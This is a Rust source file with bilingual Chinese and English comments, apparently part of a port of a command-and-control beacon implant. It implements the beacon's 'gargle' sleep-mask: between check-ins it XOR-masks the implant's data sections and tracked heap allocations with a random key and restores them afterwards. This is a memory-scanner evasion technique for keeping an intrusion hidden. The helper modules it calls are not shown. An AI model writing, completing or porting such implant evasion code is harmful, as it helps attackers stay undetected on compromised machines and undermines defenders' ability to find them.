//! gargle.cpp 的移植版 — 睡眠掩码（“gargle”）例程。
//! Port of gargle.cpp — the sleep-mask ("gargle") routine.
//!
//! `GargleSleep` 是信标在两次回连之间调用的例程：当
//! `GargleSleep` is what the beacon calls between check-ins: when the
//! `SETTING_GARGLE_NOOK` 选项被设置且没有工作线程运行时，
//! `SETTING_GARGLE_NOOK` option is set and no worker threads are running, the
//! 信标的数据段及其被跟踪的堆分配会用
//! beacon's data sections and its tracked heap allocations are XOR-masked with
//! 一个随机的 13 字节密钥进行 XOR 掩码，直到睡眠结束再恢复。
//! a random 13-byte key for the duration of the sleep, then restored.
//!
//! C++ 会将原始 asm trampoline 复制到可执行堆区域中，并在掩码状态下执行它
//! The C++ copies a raw asm trampoline into an executable heap region and
//! （trampoline 区域本身通过 `gargle_trampoline` 中的反向配对技巧
//! executes it while masked (the trampoline region itself is excluded from the
//! 排除在掩码之外）。Rust 移植版使用文档化的安全等效方案，效果相同：
//! mask via the reversed-pair trick in `gargle_trampoline`). The Rust port
//! 掩码函数是普通的 Rust 代码（绝不会从被掩码的内存中执行），
//! uses a documented safe equivalent with identical effect: the mask function
//! 相同的内存范围使用相同的 XOR 模式进行掩码
//! is ordinary Rust code (never executed from masked memory), the same memory
//! （参见 `crate::gargleint::mask_sections_and_heap`），
//! ranges are masked with the same XOR pattern (see
//! 睡眠则是在 100 ms 分片中执行普通的 `std::thread::sleep`
//! `crate::gargleint::mask_sections_and_heap`), and the sleep is a plain
//! （与 C++ 使用的粒度一致）。
//! `std::thread::sleep` in 100 ms slices (the granularity the C++ used).

use crate::beacon::SETTING_GARGLE_NOOK;
use crate::gargleint::GargleP;
use crate::settings::setting_int;
use crate::state::THREAD_COUNT;
use std::sync::atomic::Ordering;
use std::time::{Duration, Instant};

pub use crate::gargleint::gargle_trampoline;

/// `GARGLEF` — 睡眠掩码函数签名。在 C++ 中它是一个指向
/// trampoline 的原始函数指针；在 Rust 移植版中掩码例程是
/// 一个普通的 `fn(&GargleP, u32)`，由 `GargleSleep` 直接调用。
/// `GARGLEF` — the sleep-mask function signature. In the C++ it is a raw
/// function pointer into the trampoline; in the Rust port the mask routine is
/// a plain `fn(&GargleP, u32)` and `GargleSleep` calls it directly.
type GargleF = fn(&GargleP, u32);

/// `_gargle_it` — 睡眠掩码例程。
/// `_gargle_it` — the sleep-mask routine.
///
/// 掩码信标的数据段和被跟踪的堆记录，睡眠 `time` 毫秒
/// Masks the beacon's sections and tracked heap records, sleeps `time`
/// （以 100 ms 分片进行，与 C++ 的 `Sleep(100)` 粒度一致），
/// milliseconds (in 100 ms slices, matching the C++ `Sleep(100)` granularity),
/// 然后恢复所有内容。C++ 每个分片都会开/关掩码，
/// then unmasks everything. The C++ toggled the mask on/off every slice
/// 因为 trampoline 在被掩码的映像内部执行；Rust
/// because the trampoline executed from inside the masked image; the Rust
/// 等效方案在整个睡眠期间保持数据被掩码（严格更强），
/// equivalent keeps the data masked for the whole sleep (strictly stronger)
/// 之后恢复 — 用同一个密钥 XOR 两次即可还原
/// and restores it afterwards — XOR twice with the same key returns the
/// 原始字节。
/// original bytes.
fn gargle_it(parms: &GargleP, time: u32) {
    let start = Instant::now();

    /* 对我们的 Beacon 数据进行掩码 */
    /* stomp on our Beacon data */
    crate::gargleint::mask_sections_and_heap(parms);

    loop {
        std::thread::sleep(Duration::from_millis(100));
        if start.elapsed().as_millis() as u64 >= time as u64 {
            break;
        }
    }

    crate::gargleint::unmask_sections_and_heap(parms);
}

/// `setup_trampoline2` — 一次性 trampoline/参数设置。只记录标记函数的
/// 地址（在 Rust 移植版中它们永远不会通过 trampoline 被调用）。
/// `setup_trampoline2` — one-time trampoline/parameter setup. Only the
/// addresses of the marker functions are recorded (they are never called
/// through the trampoline in the Rust port).
fn setup_trampoline2() {
    gargle_trampoline(
        (setup_trampoline2 as fn()) as usize as *mut u8,
        (gargle_it as GargleF) as usize as *mut u8,
    );
}

/// `GargleSleep` — 掩码睡眠。
/// `GargleSleep` — masked sleep.
///
/// 如果禁用 gargle（`SETTING_GARGLE_NOOK == 0`）或有工作线程在运行
/// If gargle is disabled (`SETTING_GARGLE_NOOK == 0`) or worker threads are
/// （`threadcount > 0`），则与 C++ 一样执行普通睡眠。
/// running (`threadcount > 0`) this is a plain sleep, exactly like the C++.
/// 否则，信标数据将在整个睡眠期间被掩码。
/// Otherwise the beacon data is masked for the duration of the sleep.
pub fn gargle_sleep(time: u32) {
    if setting_int(SETTING_GARGLE_NOOK) == 0 || THREAD_COUNT.load(Ordering::SeqCst) > 0 {
        std::thread::sleep(Duration::from_millis(time as u64));
        return;
    }

    /* 创建我们的 trampoline */
    /* create our trampoline, please */
    setup_trampoline2();

    /* 获取要掩码的堆段，以防有新条目被添加。 */
    /* get the heap sections to mask in case new items have been added. */
    crate::gargleint::refresh_heap_records();

    /* 对我们的 Beacon 数据进行掩码 */
    /* stomp on our Beacon data */
    let parms = crate::gargleint::gparms();
    gargle_it(&parms, time);
}
